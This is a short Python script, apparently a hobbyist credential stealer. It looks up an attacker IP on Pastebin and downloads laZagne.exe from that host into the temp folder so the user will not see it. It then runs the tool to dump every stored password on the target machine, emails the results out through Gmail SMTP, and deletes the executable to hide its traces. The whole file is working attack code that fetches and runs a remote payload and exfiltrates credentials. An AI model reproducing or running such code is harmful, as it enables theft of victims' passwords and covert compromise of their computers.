import subprocess
import smtplib
import requests
import os
import tempfile


def download(url):     # This is for Lazagne download in target computer
    get_response = requests.get(url)
    file_name = url.split("/")[-1]     # To get the name of the websites
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


# In order to hide laZage file from user we change the directory to temp located deep in system :
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)


# Fetch the attacker's IP dynamically from Pastebin
ip_url = "https://pastebin.com/raw/DjTikqsH"
attacker_ip = requests.get(ip_url).text.strip()
download(f"http://{attacker_ip}/Sus_files/laZagne.exe")  # Download laZagne from attacker IP



# First we need to setup a server for email so we use google' s own server
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # Creates a instance of the free google server with port 587
    server.starttls()                             # Starts server
    server.login(email, password)                 # Logs in SMTP server
    server.sendmail(email, email, message)        
    server.quit()



command = "laZagne.exe all"     # This command for running lazagne exploit
email = "nice_try@gmail.com"
app_key = "Nice_one"

result = subprocess.check_output(command, shell=True)  # This executes the command in terminal
send_mail(email,app_key, result)              # Sends the mail
os.remove("laZagne.exe")      # deletes the software to reduce doubt



